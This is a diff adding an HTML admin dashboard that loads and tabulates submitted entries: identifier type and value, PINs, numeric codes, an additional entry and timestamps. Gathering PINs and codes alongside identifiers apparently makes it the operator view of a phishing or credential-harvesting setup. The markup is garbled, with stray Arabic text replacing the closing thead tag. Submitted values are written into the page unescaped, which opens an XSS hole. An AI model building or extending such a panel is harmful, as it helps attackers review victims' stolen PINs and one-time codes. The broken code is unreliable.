@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Submissions Dashboard</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f7f6; margin: 0; padding: 20px; }
+        .container { max-width: 1000px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        h2 { color: #333; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
+        th { background-color: #007bff; color: white; }
+        tr:nth-child(even) { background-color: #f9f9f9; }
+        .refresh-btn { background: #28a745; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-size: 14px; }
+        .refresh-btn:hover { background: #218838; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Submitted Entries Dashboard</h2>
+        <button class="refresh-btn" onclick="loadSubmissions()">Refresh Data</button>
+        <table>
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Identifier Type</th>
+                    <th>Identifier Value</th>
+                    <th>PIN</th>
+                    <th>Numeric Code</th>
+                    <th>Additional Entry</th>
+                    <th>Time</th>
+                </tr>
+            كنولوج
+            <tbody id="subTableBody">
+                <tr><td colspan="7" style="text-align:center;">Loading submissions...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        async function loadSubmissions() {
+            try {
+                const response = await fetch('/api/submissions');
+                const result = await response.json();
+                const tbody = document.getElementById('subTableBody');
+                
+                if (result.success && result.data.length > 0) {
+                    tbody.innerHTML = '';
+                    result.data.forEach(row => {
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `
+                            <td>${row.id}</td>
+                            <td>${row.identifierType || ''}</td>
+                            <td>${row.identifierValue || ''}</td>
+                            <td>${row.pinText || ''}</td>
+                            <td>${row.numericValue || ''}</td>
+                            <td>${row.anyNumberValue || ''}</td>
+                            <td>${row.created_at || ''}</td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                } else {
+                    tbody.innerHTML = `<tr><td colspan="7" style="text-align:center;">No submissions found yet.</td></tr>`;
+                }
+            } catch (err) {
+                console.error('Error fetching submissions:', err);
+                document.getElementById('subTableBody').innerHTML = `<tr><td colspan="7" style="text-align:center; color:red;">Failed to load data.</td></tr>`;
+            }
+        }
+
+        // Load data on page open
+        loadSubmissions();
+    </script>
+</body>
+</html>
